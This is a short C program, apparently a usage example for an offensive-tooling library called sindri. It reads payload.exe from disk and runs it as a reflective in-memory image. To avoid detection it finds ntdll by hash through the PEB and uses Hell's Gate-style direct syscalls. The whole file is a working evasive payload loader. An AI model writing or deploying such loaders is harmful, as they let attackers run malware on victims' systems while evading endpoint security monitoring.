#include <sindri.h>

int main() {
    // Your exe path here
    const char *file_path = "payload.exe";

    snd_status_t status;

    snd_buffer_t     file_buf = {0};
    snd_loader_ctx_t ctx      = {0};

    PVOID ntdll;
    status = snd_peb_get_module_base_by_hash(SND_HASH_NTDLL_DLL, &ntdll);
    if (status.code != SND_SUCCESS) {
        goto cleanup;
    }

    snd_set_ntdll(ntdll);

    snd_set_syscall_strategy(snd_hell_extract_syscall);

    ctx.mem_api = &snd_mem_native;
    ctx.mod_api = &snd_mod_native;

    status = snd_buffer_load_from_disk(file_path, &file_buf);
    if (status.code != SND_SUCCESS) {
        goto cleanup;
    }

    ctx.raw_source = &file_buf;

    status = snd_prepare_reflective_image(&ctx);
    if (status.code != SND_SUCCESS) {
        goto cleanup;
    }

    status = snd_execute_reflective_image(&ctx);
    if (status.code != SND_SUCCESS) {
        goto cleanup;
    }

cleanup:
    snd_detach_reflective_image(&ctx);
    snd_free_mapped_image(&ctx);
    snd_buffer_free(&file_buf);

    if (status.code != SND_SUCCESS) {
        return status.code;
    }

    return status.code;
}
